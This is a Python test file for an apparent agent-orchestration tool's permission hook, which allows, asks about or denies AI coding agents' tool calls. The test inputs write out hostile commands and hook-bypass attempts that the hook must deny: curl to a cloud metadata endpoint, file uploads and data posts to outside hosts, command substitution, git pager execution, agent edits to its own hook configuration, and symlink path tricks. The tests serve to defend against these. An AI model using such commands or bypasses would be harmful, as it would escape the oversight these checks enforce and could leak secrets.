def test_launch_warning_only_when_codex_runs_without_the_hook(ws, monkeypatch):
    assert codex_hook.launch_warning("codex", ws.path) is None  # policy off
    turn_on(ws)
    assert codex_hook.launch_warning("claude", ws.path) is None
    assert codex_hook.INSTALL in codex_hook.launch_warning("codex", ws.path)  # Codex said no
    monkeypatch.setattr(codex_hook, "_AppServer", FakeAppServer)
    codex_hook.ensure("codex")
    assert codex_hook.launch_warning("codex", ws.path) is None


def test_doctor_reports_the_codex_hook(ws, monkeypatch):
    from brindle import doctor

    monkeypatch.setattr("brindle.providers.codex_binary", lambda: "/bin/sh")
    assert doctor.codex_hook_checks(ws.repo_root) == []  # policy off
    turn_on(ws)
    [c] = doctor.codex_hook_checks(ws.repo_root)
    assert c.level == doctor.OK and "next Codex launch" in c.detail
    monkeypatch.setattr(codex_hook, "_AppServer", FakeAppServer)
    codex_hook.ensure("codex")
    [c] = doctor.codex_hook_checks(ws.repo_root)
    assert c.level == doctor.OK and c.detail.startswith("trusted")
    turn_off_in_codex()
    [c] = doctor.codex_hook_checks(ws.repo_root)
    assert c.level == doctor.WARN and codex_hook.INSTALL in c.detail


def test_start_trusts_the_hook_and_says_so_once(ws, monkeypatch, capsys):
    from brindle import cli

    monkeypatch.setattr("brindle.providers.codex_binary", lambda: "/bin/sh")
    monkeypatch.setattr(codex_hook, "_AppServer", FakeAppServer)
    cli._trust_codex_hook(ws.repo_root)
    assert codex_hook.status() == codex_hook.NEW  # policy off: left alone
    turn_on(ws)
    cli._trust_codex_hook(ws.repo_root)
    assert codex_hook.status() == codex_hook.TRUSTED
    assert "trusted brindle's Codex permission hook" in capsys.readouterr().out
    cli._trust_codex_hook(ws.repo_root)
    assert capsys.readouterr().out == ""


# -- agy: payload -> request -------------------------------------------------------------------


def agy_payload(name, args, cwd="/w"):
    return {"toolCall": {"name": name, "args": args}, "stepIdx": 3, "conversationId": "c",
            "workspacePaths": [cwd]}


# -- agy: the hook never answers nothing -------------------------------------------------------


@pytest.mark.parametrize("strict,expected", [pytest.param(False, "ask",
                 marks=pytest.mark.variant("malformed agy payload must ask when strict mode is disabled")), (True, "deny")])
@pytest.mark.parametrize("stdin", ['{"toolCall": 5}'])
def test_agy_pre_tool_fails_closed_on_bad_input(db, ws, monkeypatch, stdin, strict, expected):
    a = worker(db, ws, provider="antigravity", id_="g1")
    turn_on(ws)
    monkeypatch.setenv("BRINDLE_AGENT_ID", a.id)
    assert json.loads(antigravity.pre_tool_main(stdin, db_factory=lambda: db, strict=strict))["decision"] == expected


@pytest.mark.parametrize("strict,expected", [(False, "ask"), (True, "deny")])
def test_agy_failures_fail_closed(db, monkeypatch, strict, expected):
    def broken_db():
        raise RuntimeError("no db")

    monkeypatch.setenv("BRINDLE_AGENT_ID", "g1")
    payload = json.dumps(agy_payload("run_command", {"CommandLine": "x"}))
    assert json.loads(antigravity.pre_tool_main(payload, db_factory=broken_db, strict=strict))["decision"] == expected
    # An agent brindle doesn't know: fail closed.
    assert json.loads(antigravity.pre_tool_main(payload, db_factory=lambda: db, strict=strict))["decision"] == expected

    monkeypatch.delenv("BRINDLE_AGENT_ID", raising=False)
    monkeypatch.setattr(antigravity, "agent_from_parent", lambda: None)
    
    if strict:
        for launched, expected_launched in ((False, "ask"), (True, "deny"), (None, "deny")):
            monkeypatch.setattr(antigravity, "_launched_with_skip_flag", lambda launched=launched: launched)
            assert json.loads(antigravity.pre_tool_main(payload, db_factory=lambda: db, strict=strict))["decision"] == expected_launched
    else:
        assert json.loads(antigravity.pre_tool_main("{}", db_factory=lambda: db, strict=strict))["decision"] == "ask"
        monkeypatch.setattr(permissions, "agy_output", lambda d: (_ for _ in ()).throw(RuntimeError()))
        assert json.loads(antigravity.pre_tool_main("{}", db_factory=lambda: db, strict=strict))["decision"] == "ask"


@pytest.mark.parametrize("strict,expected,hook_name", [(False, "ask", "agy-pre-tool"), pytest.param(True, "deny", "agy-pre-tool-strict",
                 marks=pytest.mark.variant("strict CLI must deny malformed input even with prompts skipped"))])
def test_agy_cli_always_prints_json(monkeypatch, strict, expected, hook_name):
    monkeypatch.setattr(antigravity, "agent_from_parent", lambda: None)
    if strict:
        monkeypatch.setattr(antigravity, "_launched_with_skip_flag", lambda: True)
    for stdin in ("", "garbage", json.dumps(agy_payload("run_command", {"CommandLine": "git push --force"}))):
        res = CliRunner().invoke(app, ["_hook", hook_name], input=stdin)
        assert res.exit_code == 0
        assert json.loads(res.stdout)["decision"] == expected


def test_agy_pre_tool_answers_what_agy_would_do_except_a_deny(db, ws, monkeypatch, tmp_path):
    # agy reads and writes files in its workspace without asking, and its
    # "ask" would add a prompt there; so inside the workspace brindle answers
    # allow (agy's default), a deny anywhere, and ask for anything else.
    a = worker(db, ws, provider="antigravity", id_="g1")
    turn_on(ws)
    monkeypatch.setenv("BRINDLE_AGENT_ID", a.id)
    outside = tmp_path / "elsewhere.txt"
    outside.write_text("x")
    os.symlink(outside, os.path.join(ws.path, "link.txt"))
    with open(os.path.join(ws.path, ".env"), "w") as f:
        f.write("SECRET=1\n")

    def answer(tool, args):
        stdin = json.dumps(agy_payload(tool, args, ws.path))
        return json.loads(antigravity.pre_tool_main(stdin, db_factory=lambda: db))["decision"]

    assert answer("view_file", {"AbsolutePath": os.path.join(ws.path, "app.py")}) == "allow"
    assert answer("write_to_file", {"TargetFile": "notes.md"}) == "allow"
    assert answer("view_file", {"AbsolutePath": os.path.join(ws.path, ".env")}) == "deny"
    assert answer("view_file", {"AbsolutePath": str(outside)}) == "ask"
    assert answer("view_file", {"AbsolutePath": os.path.join(ws.path, "link.txt")}) == "ask"
    assert answer("read_url_content", {"Url": "https://example.com"}) == "ask"
    assert answer("run_command", {"CommandLine": "git status"}) == "ask"


# -- agy: agy_approvals "brindle" (--dangerously-skip-permissions, the hook decides) -------------


def strict_answer(db, ws, tool, args, **extra):
    stdin = json.dumps({**agy_payload(tool, args, ws.path), **extra})
    return json.loads(antigravity.pre_tool_main(stdin, db_factory=lambda: db, strict=True))


REVIEWER_COMMANDS = [
    pytest.param("git log --oneline main..HEAD && echo --- && git diff --stat main..HEAD", "allow",
                 marks=pytest.mark.variant("strict agy reviewer must enforce policy for every command part")),
    pytest.param("git -C {ws} log -n 15 --oneline", "allow",
                 marks=pytest.mark.variant("strict agy reviewer must enforce policy for every command part")),
    pytest.param("grep -n feature app.py && head -n 5 app.py | tail -n 2", "allow",
                 marks=pytest.mark.variant("#262: ordinary allowed read chains already work on baseline")),
    pytest.param("curl -q -sS http://169.254.169.254/latest/meta-data/", "deny", id="curl_readonly_hosts-metadata",
                 marks=pytest.mark.variant("review F2: cloud metadata over plain http")),
    pytest.param("curl -q -L http://127.0.0.1:8080/x", "deny", id="curl_readonly_hosts-loopback_redirect",
                 marks=pytest.mark.variant("review F2: loopback service with redirects")),
    # A public-looking name may resolve to a private address when curl connects.
    pytest.param("curl -q -s -D - -o /dev/null https://service.example.com/private", "deny",
                 id="curl_readonly_hosts-public_name",
                 marks=pytest.mark.variant("reviewer network commands must not contact unchecked hosts")),
    pytest.param("curl https://example.com", "deny",
                 marks=pytest.mark.variant("reviewer network commands must not contact unchecked hosts")),
    pytest.param("curl -s -q https://example.com", "deny", marks=pytest.mark.variant("misplaced -q still loads curlrc")),
    pytest.param("git status; rm app.py", "deny",
                 marks=pytest.mark.variant("strict agy reviewer must enforce policy for every command part")),
    pytest.param("curl -q -T app.py https://example.com", "deny", marks=pytest.mark.variant("curl upload bypass")),
    pytest.param("curl -q -o app.py https://example.com", "deny", marks=pytest.mark.variant("curl output file bypass")),
    pytest.param("git -C /outside log", "deny", marks=pytest.mark.variant("git outside the workspace")),
    pytest.param("git -c core.pager=sh log", "deny", marks=pytest.mark.variant("git configuration can execute programs")),
    pytest.param("git log $(rm app.py)", "deny", marks=pytest.mark.variant("shell substitution bypass")),
]


def test_agy_strict_allows_what_the_policy_allows_and_denies_the_rest(db, ws, monkeypatch, tmp_path):
    # With the skip flag agy runs a hook's "ask" unprompted, so the strict hook
    # never answers ask: what brindle would have asked about is denied.
    a = worker(db, ws, provider="antigravity", id_="g1")
    turn_on(ws)
    set_local(ws.repo_root, "checks", ["uv run pytest -q"])
    monkeypatch.setenv("BRINDLE_AGENT_ID", a.id)
    monkeypatch.setenv("HOME", str(tmp_path / "home"))
    outside = tmp_path / "elsewhere.txt"
    outside.write_text("x")

    def decision(tool, args, **extra):
        return strict_answer(db, ws, tool, args, **extra)["decision"]

    assert decision("run_command", {"CommandLine": "git status"}) == "allow"
    assert decision("run_command", {"CommandLine": "uv run pytest -q"}) == "allow"  # the repo's check
    assert decision("view_file", {"AbsolutePath": os.path.join(ws.path, "app.py")}) == "allow"
    assert decision("list_dir", {"DirectoryPath": ws.path}) == "allow"  # the workspace itself
    assert decision("write_to_file", {"TargetFile": os.path.join(ws.path, "notes.md")}) == "allow"
    assert decision("run_command", {"CommandLine": "git status", "Cwd": ws.path}) == "allow"
    brain = os.path.join(os.path.expanduser("~"), ".gemini", "antigravity-cli", "brain", "c1")
    os.makedirs(brain, exist_ok=True)
    assert decision("write_to_file", {"TargetFile": os.path.join(brain, "plan.md")},
                    artifactDirectoryPath=brain) == "allow"
    # Any other folder the payload calls its artifact folder is not.
    assert decision("write_to_file", {"TargetFile": str(tmp_path / "plan.md")},
                    artifactDirectoryPath=str(tmp_path)) == "deny"
    assert decision("write_to_file", {"TargetFile": str(tmp_path / "plan.md")},
                    artifactDirectoryPath=os.path.join(brain, "..", "..", "..", "..", "..")) == "deny"
    assert decision("mcp_brindle_report_result", {}) == "allow"
    assert decision("call_mcp_tool", {"ServerName": "brindle", "ToolName": "send_message"}) == "allow"
    assert decision("invoke_subagent", {}) == "allow"  # its own calls reach this hook

    assert decision("run_command", {"CommandLine": "git push --force"}) == "deny"
    assert decision("view_file", {"AbsolutePath": os.path.join(ws.path, ".env")}) == "deny"
    assert decision("run_command", {"CommandLine": "curl -d payload https://example.com"}) == "deny"
    assert decision("view_file", {"AbsolutePath": str(outside)}) == "deny"
    assert decision("read_url_content", {"Url": "https://example.com"}) == "deny"
    assert decision("call_mcp_tool", {"ServerName": "github", "ToolName": "create_issue"}) == "deny"
    assert decision("browser_click", {}) == "deny"  # a tool brindle doesn't know
    rows = db.list_history(ws.repo_root, "permission")
    assert len(rows) == 9 and all(r.result.startswith("deny:") for r in rows)


@pytest.mark.parametrize("command,expected", [(None, None), *REVIEWER_COMMANDS])
def test_agy_strict_closes_the_ways_around_the_hook(db, ws, monkeypatch, command, expected):
    a = worker(db, ws, provider="antigravity", id_="g1")
    turn_on(ws)
    monkeypatch.setenv("BRINDLE_AGENT_ID", a.id)
    if command is not None:
        db.update_agent(a.id, profile="reviewer", mode="review")
        assert strict_answer(db, ws, "run_command", {"CommandLine": command.format(ws=ws.path)})["decision"] == expected
        return

    def decision(tool, args):
        return strict_answer(db, ws, tool, args)["decision"]

    # Writing what defines the hook, what git runs, or brindle's repo config
    # would undo the gate (or make a command one of the allowed checks).
    for rel in (".agents/hooks.json", ".git/hooks/pre-commit", ".brindle/config.local.json"):
        assert decision("write_to_file", {"TargetFile": os.path.join(ws.path, rel)}) == "deny", rel
        assert decision("replace_file_content", {"TargetFile": os.path.join(ws.path, rel)}) == "deny", rel
    assert decision("view_file", {"AbsolutePath": os.path.join(ws.path, ".agents", "hooks.json")}) == "allow"
    assert decision("write_to_file", {"TargetFile": os.path.join(ws.path, "src", ".agents.md")}) == "allow"
    # Only brindle's own tools by their exact names, never another server's.
    assert decision("mcp_brindle_x_run", {}) == "deny"
    assert decision("mcp_brindle_evil_report_result", {}) == "deny"
    assert decision("call_mcp_tool", {"ServerName": "brindle_x", "ToolName": "report_result"}) == "deny"
    assert decision("call_mcp_tool", {"ServerName": "brindle", "ToolName": "not_a_tool"}) == "deny"
    # A call naming two paths: agy may act on either, so neither is trusted.
    hooks = os.path.join(ws.path, ".agents", "hooks.json")
    assert decision("write_to_file", {"AbsolutePath": os.path.join(ws.path, "ok.txt"),
                                      "TargetFile": hooks}) == "deny"
    # The protected folders are anchored to brindle's worktree and repo, not
    # to what the payload says the workspace is.
    wide = strict_answer(db, ws, "write_to_file", {"TargetFile": hooks}, workspacePaths=["/"])
    assert wide["decision"] == "deny"
    root_hooks = os.path.join(ws.repo_root, ".git", "hooks", "pre-commit")
    assert strict_answer(db, ws, "write_to_file", {"TargetFile": root_hooks},
                         workspacePaths=[ws.repo_root])["decision"] == "deny"
    # Its own worktree sits under the repo's .brindle (#182); another one there doesn't.
    sibling = os.path.join(ws.repo_root, ".brindle", "worktrees", "other", "app.py")
    assert strict_answer(db, ws, "write_to_file", {"TargetFile": sibling},
                         workspacePaths=[ws.repo_root])["decision"] == "deny"
    # Whatever agy might read differently from brindle is denied, not guessed:
    # a relative path (agy may not resolve it against Cwd), a JSON-encoded
    # value, ~, or a command run outside the worktree.
    src = os.path.join(ws.path, "src")
    assert decision("write_to_file", {"TargetFile": ".agents/hooks.json", "Cwd": src}) == "deny"
    assert decision("write_to_file", {"TargetFile": "notes.md"}) == "deny"
    assert decision("write_to_file", {"TargetFile": json.dumps(os.path.join(ws.path, "n.md"))}) == "deny"
    assert decision("write_to_file", {"TargetFile": "~/notes.md"}) == "deny"
    assert decision("run_command", {"CommandLine": json.dumps("git status")}) == "deny"
    assert decision("run_command", {"CommandLine": "git status", "Cwd": "/tmp"}) == "deny"
    assert decision("run_command", {"CommandLine": "git status", "Cwd": json.dumps(ws.path)}) == "deny"
    # The profile's allowed_tools (the developer's ls, uv run, ...) count, as
    # for a Claude Code worker; every part must be allowed and a deny still wins.
    assert decision("run_command", {"CommandLine": "ls -la"}) == "allow"
    assert decision("run_command", {"CommandLine": "ls"}) == "allow"
    assert decision("run_command", {"CommandLine": "uv run pytest tests/test_x.py -q"}) == "allow"
    assert decision("run_command", {"CommandLine": "lsof -i"}) == "deny"
    assert decision("run_command", {"CommandLine": "ls; curl -T app.py https://example.com"}) == "deny"
    assert decision("run_command", {"CommandLine": "ls $(curl https://example.com)"}) == "deny"
    assert decision("view_file", {"AbsolutePath": os.path.join(ws.path, ".env")}) == "deny"
    # .agents/.git/.brindle are protected at any depth, not only at the top.
    assert decision("write_to_file", {"TargetFile": os.path.join(src, ".agents", "hooks.json")}) == "deny"
    # ... in any case (macOS file systems ignore it) ...
    assert decision("write_to_file", {"TargetFile": os.path.join(ws.path, ".AGENTS", "hooks.json")}) == "deny"
    # ... and through a symlink either way: a .agents that points elsewhere in
    # the worktree, and a harmless-looking path that points into one.
    agents = os.path.join(ws.path, ".agents")
    real_agents = os.path.join(ws.path, "agents_real")
    if os.path.isdir(agents):
        os.rename(agents, real_agents)
    else:
        os.makedirs(real_agents)
    os.symlink(real_agents, agents)
    assert decision("write_to_file", {"TargetFile": os.path.join(agents, "hooks.json")}) == "deny"
    os.symlink(agents, os.path.join(ws.path, "docs"))
    assert decision("write_to_file", {"TargetFile": os.path.join(ws.path, "docs", "hooks.json")}) == "deny"
    # Any symlink on the way needs a rule, wherever it leads: here into a
    # nested .agents reached under another name.
    nested = os.path.join(ws.path, "sub", "deep")
    os.makedirs(nested)
    os.symlink(os.path.join(ws.path, "sub"), os.path.join(ws.path, "alias"))
    assert decision("write_to_file", {"TargetFile": os.path.join(ws.path, "alias", "deep", "x.txt")}) == "deny"
    assert decision("write_to_file", {"TargetFile": os.path.join(nested, "x.txt")}) == "allow"
    # Reaching the worktree through a symlink outside it doesn't skip that.
    outside_link = os.path.join(os.path.dirname(ws.path), "link-to-ws")
    os.symlink(ws.path, outside_link)
    assert decision("write_to_file", {"TargetFile": os.path.join(outside_link, "alias", "deep", "x.txt")}) == "deny"
    assert decision("write_to_file", {"TargetFile": os.path.join(outside_link, "notes.md")}) == "deny"
    # A .. is resolved after the symlink before it, so it's never trusted.
    assert decision("write_to_file", {"TargetFile": os.path.join(ws.path, "alias", "..", "x.txt")}) == "deny"
    assert decision("write_to_file", {"TargetFile": os.path.join(ws.path, "sub", "..", "x.txt")}) == "deny"
    # agy tools not checked to stay inside the conversation are denied.
    for tool in ("define_subagent", "manage_subagents", "schedule", "read_resource", "list_resources"):
        assert decision(tool, {}) == "deny", tool


@pytest.mark.variant("skip-permissions launch must register strict hooks for every tool")
def test_agy_strict_launch_skips_prompts_and_hooks_every_tool(db, ws, monkeypatch):
    from brindle.profiles import load_profile
    from brindle.providers import Antigravity, LaunchContext

    monkeypatch.setenv("BRINDLE_AGY_BIN", "/bin/agy")
    monkeypatch.setattr(antigravity, "tool_names", lambda: ["report_result"])

    def launch():
        argv = Antigravity().command(LaunchContext("g1", load_profile("developer"), None, cwd=ws.path))
        hooks = json.loads(open(os.path.join(ws.path, ".agents", "hooks.json")).read())["brindle"]
        return argv, hooks.get("PreToolUse")

    set_local(ws.repo_root, "agy_approvals", "brindle")
    set_local(ws.repo_root, "permission_policy", "off")
    argv, [entry] = launch()
    assert antigravity.SKIP_FLAG in argv  # whatever the policy says
    assert entry["matcher"] == "*" and "agy-pre-tool-strict" in entry["hooks"][0]["command"]
    set_local(ws.repo_root, "agy_approvals", "prompt")
    argv, _ = launch()
    assert antigravity.SKIP_FLAG not in argv


def test_launched_with_skip_flag_reads_the_agy_process(monkeypatch):
    commands = {10: "/bin/sh -c brindle _hook", 20: "/Users/x/.local/bin/agy --dangerously-skip-permissions -i hi"}
    parents = {10: 20, 20: 1}
    monkeypatch.setattr(os, "getppid", lambda: 10)
    monkeypatch.setattr(antigravity, "_parent", lambda pid: parents.get(pid))

    class Done:
        def __init__(self, out):
            self.stdout = out

    monkeypatch.setattr(antigravity.subprocess, "run", lambda argv, **kw: Done(commands.get(int(argv[-1]), "")))
    assert antigravity._launched_with_skip_flag() is True
    commands[20] = "/Users/x/.local/bin/agy -i hi"
    assert antigravity._launched_with_skip_flag() is False
    commands[20] = "python something"
    assert antigravity._launched_with_skip_flag() is None


# -- agy: mirroring brindle's rules into its settings --------------------------------------------


ORIGINAL = """{
    "colorScheme": "tokyo night",
    "trustedWorkspaces": ["/a"],
    "permissions": {
        "allow": [
            "command(regex:^git status$)",
            "command(npm)"
        ],
        "ask": ["command(*)"]
    }
}
"""


def test_agy_sync_adds_and_removes_only_its_own_entries(agy_settings, monkeypatch, ws):
    agy_settings.parent.mkdir(parents=True)
    agy_settings.write_text(ORIGINAL)
    monkeypatch.chdir(ws.repo_root)
    set_local(ws.repo_root, "checks", ["uv run pytest -q"])
    r = CliRunner()

    # Policy off and nothing of brindle's there: nothing changes.
    res = r.invoke(app, ["permissions", "sync-agy"])
    assert res.exit_code == 0 and "already in sync" in res.output
    assert agy_settings.read_text() == ORIGINAL

    turn_on(ws)
    res = r.invoke(app, ["permissions", "sync-agy"])
    assert res.exit_code == 0, res.output
    data = json.loads(agy_settings.read_text())
    allow, deny = data["permissions"]["allow"], data["permissions"]["deny"]
    assert allow[:2] == ["command(regex:^git status$)", "command(npm)"]  # the person's, first, untouched
    assert "command(regex:^git diff$)" in allow
    assert not any("pytest" in e for e in allow)  # a repo's checks stay out of agy's global settings
    assert allow.count("command(regex:^git status$)") == 1  # theirs already; not brindle's
    assert f"read_file({os.path.expanduser('~/.ssh')})" in deny
    assert data["colorScheme"] == "tokyo night" and data["permissions"]["ask"] == ["command(*)"]
    assert agy_settings.read_text().startswith('{\n    "colorScheme"')  # same indentation
    backup = agy_settings.with_name("settings.json.brindle-backup")
    assert backup.read_text() == ORIGINAL
    managed = permissions.load_store().agy_managed
    assert "command(regex:^git status$)" not in managed["allow"]

    # Idempotent.
    before = agy_settings.read_text()
    assert "already in sync" in r.invoke(app, ["permissions", "sync-agy"]).output
    assert agy_settings.read_text() == before

    # Changing brindle's rules re-syncs; the backup is made only once.
    res = r.invoke(app, ["permissions", "allow", "bash", "make lint"])
    rule_id = res.output.split(":")[0]
    assert "command(regex:^make lint$)" in json.loads(agy_settings.read_text())["permissions"]["allow"]
    r.invoke(app, ["permissions", "deny", "bash", "rm -rf", "--prefix"])
    assert "command(regex:^rm -rf)" in json.loads(agy_settings.read_text())["permissions"]["deny"]
    r.invoke(app, ["permissions", "forget", rule_id])
    assert "command(regex:^make lint$)" not in json.loads(agy_settings.read_text())["permissions"]["allow"]
    assert backup.read_text() == ORIGINAL

    # Something the person adds meanwhile stays.
    data = json.loads(agy_settings.read_text())
    data["permissions"]["allow"].append("command(ls)")
    agy_settings.write_text(json.dumps(data, indent=4) + "\n")

    # Off: brindle's entries go; everything else is as it was.
    set_local(ws.repo_root, "permission_policy", "off")
    res = r.invoke(app, ["permissions", "sync-agy"])
    assert res.exit_code == 0 and "removed" in res.output
    data = json.loads(agy_settings.read_text())
    expected = json.loads(ORIGINAL)
    expected["permissions"]["allow"].append("command(ls)")
    assert data == expected
    assert permissions.load_store().agy_managed == {}


def test_agy_sync_leaves_a_file_it_cannot_read(agy_settings, ws):
    agy_settings.parent.mkdir(parents=True)
    agy_settings.write_text("{ not json")
    with pytest.raises(antigravity.SettingsError):
        antigravity.sync_permissions(ws.repo_root, on=True, checks=[])
    assert agy_settings.read_text() == "{ not json"


@pytest.mark.variant("disabling policy must remove only its managed agy settings")
def test_agy_launch_syncs_only_with_the_policy(agy_settings, ws, monkeypatch):
    from brindle.profiles import load_profile
    from brindle.providers import Antigravity, LaunchContext

    monkeypatch.setattr(antigravity, "tool_names", lambda: ["report_result"])
    ctx = LaunchContext("g1", load_profile("developer"), "hi", cwd=ws.path)
    Antigravity().command(ctx)
    assert not agy_settings.exists()  # off: never touched
    turn_on(ws)
    Antigravity().command(ctx)
    assert "command(regex:^git log$)" in json.loads(agy_settings.read_text())["permissions"]["allow"]
    set_local(ws.repo_root, "permission_policy", "off")
    Antigravity().command(ctx)
    assert not agy_settings.exists()


def test_agy_sync_leaves_the_real_home_alone_under_another_brindle_home(ws, monkeypatch, tmp_path):
    home = tmp_path / "realhome"
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setattr(antigravity, "settings_path", antigravity._default_settings_path)
    assert antigravity.sync_permissions(ws.repo_root, on=True, checks=[]) == ([], [])
    assert not (home / ".gemini").exists()


@pytest.mark.parametrize("with_rule", [pytest.param(False,
                 marks=pytest.mark.variant("without a bound hook an approval cannot offer one-time execution")), True])
def test_allow_always_offers_only_a_persistent_rule(db, ws, with_rule):
    rule = {"type": "addRules", "rules": [{"toolName": "Bash", "ruleContent": "npm test:*"}],
            "behavior": "allow", "destination": "localSettings"}
    incident = [{"type": "addDirectories", "directories": [ws.path], "destination": "session"},
                {"type": "setMode", "mode": "acceptEdits", "destination": "session"}]
    a = worker(db, ws, "claude")
    payload = {"session_id": "s", "cwd": ws.path, "tool_name": "Bash", "tool_input": {"command": "npm test"},
               "permission_suggestions": [*incident, *([rule] if with_rule else [])]}
    agents.permission_request_decision(db, a, payload)
    [row] = db.permission_requests_of(a.id)
    assert (json.loads(row["suggestions"]) if row["suggestions"] else None) == ([rule] if with_rule else None)


def test_a_dead_codex_hooks_request_row_is_removed_from_an_idle_agents_inbox(db, ws):
    from brindle.service import inbox

    a = worker(db, ws)    # not waiting: the turn completed after Codex cancelled the call
    db.add_permission_request(a.id, "r1", json.dumps(permissions.Request("codex", "bash", "Bash").to_dict()),
                              "asking", None, "hook", hold_until=time.time() + 60)
    assert inbox.items(db, None) == []   # no daemon holds it: the hook died
    assert db.permission_requests_of(a.id) == []


@pytest.mark.variant("a hook registering during orphan cleanup must keep its live request")
def test_cleanup_keeps_a_request_whose_hook_registers_during_it(db, ws, monkeypatch):
    from brindle.daemon.holds import HOLDS
    from brindle.service import inbox

    a = worker(db, ws)
    real = HOLDS.of_agent

    def registers_after_the_snapshot(agent_id):
        held = real(agent_id)
        # The hook's order: hold first, then its row.
        assert HOLDS.register(agent_id, "r2", "d", "n", time.time() + 60)
        db.add_permission_request(agent_id, "r2", "{}", "asking", None, "hook", hold_until=time.time() + 60)
        return held

    monkeypatch.setattr(HOLDS, "of_agent", registers_after_the_snapshot)
    inbox.drop_orphan_requests(db, a)
    assert [r["tool_use_id"] for r in db.permission_requests_of(a.id)] == ["r2"]
    HOLDS.drop_agent(a.id)


def test_agy_profile_rules_stay_out_of_shared_settings_and_are_named(agy_settings, db, ws, monkeypatch):
    # GitHub #233: under an explicit agy_approvals "prompt" agy applies only its own
    # settings, which every agy session shares, so a profile's allowed_tools
    # can't be given to one worker alone. They're named instead, and a second
    # profile never inherits the first's.
    from brindle.config import user_profiles_dir
    from brindle.profiles import load_profile
    from brindle.providers import Antigravity, LaunchContext

    monkeypatch.setattr(antigravity, "tool_names", lambda: ["report_result"])
    user_profiles_dir().mkdir(parents=True, exist_ok=True)
    for name, tools in (("gem-a", "Bash(git commit:*)"), ("gem-b", "Bash(pwd), Bash(ls), WebFetch")):
        (user_profiles_dir() / f"{name}.md").write_text(
            f"---\nname: {name}\nprovider: antigravity\nallowed_tools: {tools}\n---\nhi\n")
    agy_settings.parent.mkdir(parents=True)
    agy_settings.write_text(json.dumps({"permissions": {"allow": ["command(regex:^pwd$)"]}}))
    set_local(ws.repo_root, "agy_approvals", "prompt")
    for id_, name in (("a1", "gem-a"), ("b1", "gem-b")):
        worker(db, ws, provider="antigravity", id_=id_)
        db.update_agent(id_, profile=name)
        Antigravity().command(LaunchContext(id_, load_profile(name, ws.repo_root), "hi", cwd=ws.path))
    assert json.loads(agy_settings.read_text())["permissions"]["allow"] == ["command(regex:^pwd$)"]
    assert antigravity.unapplied_rules(load_profile("gem-b", ws.repo_root)) == ["Bash(ls)", "WebFetch"]
    assert "Bash(git commit:*)" in antigravity.launch_warning(db.get_agent("a1"), ws)
    set_local(ws.repo_root, "agy_approvals", "brindle")
    assert antigravity.launch_warning(db.get_agent("a1"), ws) is None  # brindle's hook applies them


def test_agy_mirror_never_widens_an_allow():
    rules = [Rule("bash", "echo $(id)", "exact", "allow"),     # brindle never allows it
             Rule("bash", "npm *", "glob", "allow"),           # agy can't say it as narrowly
             Rule("bash", "a;b", "prefix", "allow"),
             Rule("read", "src/*.py", "glob", "allow"),
             Rule("read", "src", "prefix", "allow"),           # not a folder: could be src2/...
             Rule("fetch", "https://x.com/a", "exact", "allow"),
             Rule("read", "docs/", "prefix", "allow"),
             Rule("mcp", "mcp__gh__", "prefix", "allow"),
             Rule("bash", "npm test", "exact", "allow")]
    out = permissions.mirror_agy(rules, ["make check", "a && b"])
    assert out["allow"] == ["read_file(docs/)", "mcp(gh/*)", "command(regex:^npm test$)"]
    out = permissions.mirror_agy(permissions.preset_rules("standard"), ["make check", "a && b"])
    # agy's settings apply to every project, and a repo's check runs what
    # that repo defines: allowed for brindle workers in that repo, never
    # everywhere agy runs.
    assert not any("make check" in e or "a && b" in e for e in out["allow"])
    assert "command(regex:^git status$)" in out["allow"]
    assert not any("tracked" in e for e in out["allow"])
